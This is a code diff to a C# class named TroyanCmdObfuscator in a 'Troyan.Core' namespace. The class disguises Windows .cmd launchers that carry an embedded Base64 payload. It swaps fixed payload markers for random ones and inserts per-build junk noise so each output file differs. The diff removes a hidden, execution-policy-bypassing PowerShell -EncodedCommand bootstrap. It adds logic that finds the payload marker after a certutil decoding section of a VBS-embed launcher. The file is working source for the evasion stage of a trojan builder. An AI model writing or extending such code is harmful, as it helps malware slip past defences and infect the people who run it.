@@ -1,12 +1,10 @@
 using System.Text;
-using System.Text.RegularExpressions;
 
 namespace Troyan.Core;
 
 /// <summary>
-/// Light CMD obfuscation: random Base64 markers, PowerShell <c>-EncodedCommand</c> (UTF-16LE Base64),
-/// and per-build junk lines at begin / middle / end so each output file differs.
-/// Path of the .cmd is passed via a short-lived env var because <c>%~f0</c> is not expanded inside an encoded script.
+/// CMD obfuscation for the VBS-embed launcher: random Base64 markers + junk noise.
+/// No PowerShell (<c>-EncodedCommand</c> removed).
 /// </summary>
 public sealed class TroyanCmdObfuscator : ITroyanCmdObfuscator
 {
@@ -14,10 +12,6 @@ public sealed class TroyanCmdObfuscator : ITroyanCmdObfuscator
     private const string EndMarker = "::END_B64::";
 
     private static readonly Random Shared = new();
-
-    private static readonly Regex CommandLineRegex = new(
-        @"^(?<prefix>\s*powershell\.exe\s+-NoProfile\s+-ExecutionPolicy\s+Bypass\s+-WindowStyle\s+Hidden\s+)-Command\s+""(?<script>.*)""\s*$",
-        RegexOptions.Multiline | RegexOptions.CultureInvariant);
 
     public string Obfuscate(string cmdText)
     {
@@ -32,38 +26,13 @@ public sealed class TroyanCmdObfuscator : ITroyanCmdObfuscator
         while (string.Equals(beginTag, endTag, StringComparison.Ordinal))
             endTag = "::" + PowerShellObfuscator.GenerateRandomName() + "::";
 
-        var envName = "_" + PowerShellObfuscator.GenerateRandomName();
-
         var withMarkers = cmdText
             .Replace(BeginMarker, beginTag, StringComparison.Ordinal)
             .Replace(EndMarker, endTag, StringComparison.Ordinal);
 
-        var match = CommandLineRegex.Match(withMarkers);
-        if (!match.Success)
-            throw new InvalidOperationException("CMD text must contain a powershell.exe -Command \"...\" bootstrap line.");
-
-        var script = match.Groups["script"].Value;
-        script = script.Replace("$p='%~f0'", "$p=$env:" + envName, StringComparison.Ordinal);
-        script = script.Replace(
-            "(?s)::BEGIN_B64::\\r?\\n(.+?)\\r?\\n::END_B64::",
-            "(?s)" + Regex.Escape(beginTag) + "\\r?\\n(.+?)\\r?\\n" + Regex.Escape(endTag),
-            StringComparison.Ordinal);
-
-        var encoded = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
-        var prefix = match.Groups["prefix"].Value;
-        var newLine = prefix + "-EncodedCommand " + encoded;
-
-        var setLine = "set \"" + envName + "=%~f0\"";
-        var replaced = CommandLineRegex.Replace(withMarkers, newLine, 1);
-        var psIdx = replaced.IndexOf(newLine, StringComparison.Ordinal);
-        if (psIdx < 0)
-            throw new InvalidOperationException("Failed to rewrite powershell bootstrap line.");
-
-        replaced = replaced.Insert(psIdx, setLine + Environment.NewLine);
-        return InjectNoise(replaced);
+        return InjectNoise(withMarkers);
     }
 
-    /// <summary>Inserts junk REM/set blocks after <c>@echo off</c>, between bootstrap and payload, and after the end marker.</summary>
     private static string InjectNoise(string cmd)
     {
         var nl = cmd.Contains("\r\n", StringComparison.Ordinal) ? "\r\n" : "\n";
@@ -83,17 +52,53 @@ public sealed class TroyanCmdObfuscator : ITroyanCmdObfuscator
 
         var withHead = cmd[..afterEcho] + headNoise + cmd[afterEcho..];
 
-        var exitIdx = withHead.IndexOf("exit /b", StringComparison.OrdinalIgnoreCase);
-        if (exitIdx < 0)
-            throw new InvalidOperationException("CMD text must contain exit /b.");
+        // Place mid-noise after the relaunch stub / before payload markers.
+        var beginIdx = IndexOfMarkerLine(withHead, nl);
+        if (beginIdx < 0)
+            throw new InvalidOperationException("CMD text must contain a ::...:: payload begin marker.");
 
-        var afterExit = withHead.IndexOf(nl, exitIdx, StringComparison.Ordinal);
-        if (afterExit < 0)
-            afterExit = exitIdx + "exit /b".Length;
-        else
-            afterExit += nl.Length;
+        var withMid = withHead[..beginIdx] + midNoise + withHead[beginIdx..];
+        return withMid.TrimEnd() + nl + tailNoise;
+    }
 
-        return withHead[..afterExit] + midNoise + withHead[afterExit..] + nl + tailNoise;
+    private static int IndexOfMarkerLine(string cmd, string nl)
+    {
+        // First line that looks like ::Name:: at start of a line (payload begin).
+        var offset = 0;
+        while (offset < cmd.Length)
+        {
+            var lineEnd = cmd.IndexOf(nl, offset, StringComparison.Ordinal);
+            var line = lineEnd < 0 ? cmd[offset..] : cmd[offset..lineEnd];
+            var t = line.Trim();
+            if (t.Length >= 4 && t.StartsWith("::", StringComparison.Ordinal) && t.EndsWith("::", StringComparison.Ordinal)
+                && !t.Equals("::BEGIN_B64::", StringComparison.Ordinal)) // already randomized by now
+            {
+                // Prefer the begin marker that appears before a long base64-ish block:
+                // both begin and end match; take the first ::x:: after :main / certutil section.
+                if (offset > 0 && cmd.LastIndexOf("certutil", offset, StringComparison.OrdinalIgnoreCase) >= 0)
+                    return offset;
+            }
+
+            if (lineEnd < 0)
+                break;
+            offset = lineEnd + nl.Length;
+        }
+
+        // Fallback: first ::tag:: line in file after @echo off.
+        offset = 0;
+        while (offset < cmd.Length)
+        {
+            var lineEnd = cmd.IndexOf(nl, offset, StringComparison.Ordinal);
+            var line = lineEnd < 0 ? cmd[offset..] : cmd[offset..lineEnd];
+            var t = line.Trim();
+            if (t.Length >= 4 && t.StartsWith("::", StringComparison.Ordinal) && t.EndsWith("::", StringComparison.Ordinal))
+                return offset;
+            if (lineEnd < 0)
+                break;
+            offset = lineEnd + nl.Length;
+        }
+
+        return -1;
     }
 
     private static string BuildNoiseBlock(int lineCount, string nl)
